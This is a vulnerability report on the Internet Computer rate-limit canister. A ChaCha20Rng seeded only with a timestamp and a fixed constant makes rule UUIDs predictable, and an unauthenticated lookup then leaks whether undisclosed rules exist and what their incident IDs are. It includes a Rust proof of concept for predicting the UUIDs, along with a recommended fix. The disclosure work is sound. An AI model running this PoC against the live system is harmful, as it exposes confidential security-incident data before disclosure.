### Title
Predictable ChaCha20Rng Seed Enables Undisclosed Rule ID Enumeration and Incident Correlation — (`rs/boundary_node/rate_limits/canister/random.rs`)

---

### Summary

The rate-limit canister seeds its `ChaCha20Rng` with only 64 bits of entropy (the IC consensus timestamp at canister initialization), with the remaining 24 bytes hardcoded to `42`. Because the IC consensus time is publicly observable and the RNG state persists deterministically across calls, an unprivileged attacker can reconstruct the full RNG stream, predict all future rule UUIDs, and use `get_rule_by_id` to confirm the existence of undisclosed rules and read their `incident_id` before public disclosure.

---

### Finding Description

**Weak seed construction** in `random.rs`:

```rust
let mut seed = [42; 32];
seed[..8].copy_from_slice(&time().to_le_bytes());
RefCell::new(ChaCha20Rng::from_seed(seed))
```

The effective seed space is 2^64 (the IC nanosecond timestamp), with bytes 8–31 fixed as `0x2A`. [1](#0-0) 

**UUID generation** routes through this RNG via `getrandom`:

```rust
fn generate_random_uuid() -> Result<Uuid, anyhow::Error> {
    let mut buf = [0_u8; 16];
    getrandom::getrandom(&mut buf)...
    let uuid = Uuid::from_slice(&buf)...
}
``` [2](#0-1) 

The `getrandom` call dispatches to `custom_getrandom_bytes_impl`, which calls `rng.fill_bytes(dest)` on the same seeded `thread_local` RNG. [3](#0-2) 

**`get_rule_by_id` leaks existence and `incident_id` for undisclosed rules.** For an unprivileged caller (`RestrictedRead`), the `RuleConfidentialityFormatter` only redacts `rule_raw` and `description`; it still returns `Ok` with `incident_id`, `id`, `added_in_version`, and `removed_in_version` populated: [4](#0-3) [5](#0-4) 

A `NotFound` error is returned only when the UUID does not exist at all, creating a clear oracle distinguishing "rule exists but undisclosed" from "rule does not exist". [6](#0-5) 

---

### Impact Explanation

An unprivileged attacker can:

1. **Confirm existence** of a newly added undisclosed rule before it is publicly disclosed.
2. **Read `incident_id`** of the undisclosed rule, directly correlating it with a specific security incident.
3. **Track rule lifecycle** (`added_in_version`, `removed_in_version`) for undisclosed rules.

This breaks the confidentiality invariant that undisclosed rule IDs must not be predictable or discoverable by unprivileged callers. The `incident_id` field is a UUID that links rules to security incidents; knowing it before disclosure allows an attacker to monitor when a specific incident's rules are added or removed.

---

### Likelihood Explanation

**High.** All inputs to reconstruct the attack are publicly available:

- **IC consensus time** at canister initialization is observable from the blockchain (the block timestamp of the block containing the `install_code` call). The search space is at most a few seconds of nanosecond timestamps, trivially brute-forceable.
- **Number of UUIDs already generated** is observable by calling `get_config` and counting distinct rule IDs across all versions (each new rule consumes exactly one 16-byte RNG draw).
- **ChaCha20Rng** is a standard, publicly documented CSPRNG; reconstructing its output from a known seed is trivial.

No privileged access, key material, or network-level attack is required. The entire attack is executable via standard IC query calls.

---

### Recommendation

Replace the weak seed with IC-native randomness:

- Use `ic_cdk::api::management_canister::main::raw_rand()` (an async call to the IC management canister that returns 32 bytes of certified randomness) to seed the RNG at initialization, or re-seed it per UUID generation.
- Alternatively, use `raw_rand()` directly as the source of randomness for UUID generation, bypassing the local RNG entirely.
- Remove the hardcoded `[42; 32]` fallback seed entirely.

---

### Proof of Concept

```rust
use rand_chacha::ChaCha20Rng;
use rand_chacha::rand_core::{RngCore, SeedableRng};
use uuid::Uuid;

fn predict_uuids(init_timestamp_ns: u64, num_already_generated: usize, predict_next: usize) -> Vec<Uuid> {
    // Reconstruct the seed exactly as random.rs does
    let mut seed = [42u8; 32];
    seed[..8].copy_from_slice(&init_timestamp_ns.to_le_bytes());
    let mut rng = ChaCha20Rng::from_seed(seed);

    // Fast-forward past already-generated UUIDs
    let mut buf = [0u8; 16];
    for _ in 0..num_already_generated {
        rng.fill_bytes(&mut buf);
    }

    // Predict next UUIDs
    (0..predict_next).map(|_| {
        rng.fill_bytes(&mut buf);
        Uuid::from_slice(&buf).unwrap()
    }).collect()
}

// Attack:
// 1. Read init_timestamp from IC block explorer (block containing install_code)
// 2. Count existing rule IDs via get_config to get num_already_generated
// 3. Call predict_uuids() to get the next UUID
// 4. Call get_rule_by_id(predicted_uuid) — if Ok, rule exists and incident_id is leaked
```

The attacker observes `init_timestamp_ns` from the public blockchain, counts existing rules via `get_config` (a public query), and calls `get_rule_by_id` with the predicted UUID. A successful `Ok` response with `incident_id` populated confirms the undisclosed rule's existence and its associated security incident. [1](#0-0) [2](#0-1) [7](#0-6)

### Citations

**File:** rs/boundary_node/rate_limits/canister/random.rs (L9-13)
```rust
  static RNG: RefCell<ChaCha20Rng> = {
    let mut seed = [42; 32];
    seed[..8].copy_from_slice(&time().to_le_bytes());
    RefCell::new(ChaCha20Rng::from_seed(seed))
  };
```

**File:** rs/boundary_node/rate_limits/canister/random.rs (L22-28)
```rust
pub fn custom_getrandom_bytes_impl(dest: &mut [u8]) -> Result<(), getrandom::Error> {
    RNG.with(|rng| {
        let mut rng = rng.borrow_mut();
        rng.fill_bytes(dest);
    });

    Ok(())
```

**File:** rs/boundary_node/rate_limits/canister/add_config.rs (L186-193)
```rust
fn generate_random_uuid() -> Result<Uuid, anyhow::Error> {
    let mut buf = [0_u8; 16];
    getrandom::getrandom(&mut buf)
        .map_err(|e| anyhow::anyhow!(e))
        .context("Failed to generate random bytes")?;
    let uuid = Uuid::from_slice(&buf).context("Failed to create UUID from bytes")?;
    Ok(uuid)
}
```

**File:** rs/boundary_node/rate_limits/canister/confidentiality_formatting.rs (L34-42)
```rust
    fn format(&self, rule: OutputRuleMetadata) -> OutputRuleMetadata {
        let mut rule = rule;
        // Redact (hide) fields of non-disclosed rule
        if rule.disclosed_at.is_none() {
            rule.description = None;
            rule.rule_raw = None;
        }
        rule
    }
```

**File:** rs/boundary_node/rate_limits/canister/getter.rs (L215-245)
```rust
    fn get(&self, rule_id: &Self::Input) -> Result<Self::Output, Self::Error> {
        let rule_id = RuleId::try_from(rule_id.clone())
            .map_err(|_| GetEntityError::InvalidUuidFormat(rule_id.clone()))?;

        let stored_rule = self
            .canister_api
            .get_rule(&rule_id)
            .ok_or_else(|| GetEntityError::NotFound(rule_id.0.to_string()))?;

        let output_rule = OutputRuleMetadata {
            id: rule_id,
            incident_id: stored_rule.incident_id,
            rule_raw: Some(stored_rule.rule_raw),
            description: Some(stored_rule.description),
            disclosed_at: stored_rule.disclosed_at,
            added_in_version: stored_rule.added_in_version,
            removed_in_version: stored_rule.removed_in_version,
        };

        let is_authorized_viewer = self.access_resolver.get_access_level()
            == AccessLevel::FullAccess
            || self.access_resolver.get_access_level() == AccessLevel::FullRead;

        if is_authorized_viewer {
            return Ok(output_rule.into());
        }

        // Hide non-disclosed rules from unauthorized viewers.
        let output_rule = self.formatter.format(output_rule);

        Ok(output_rule.into())
```
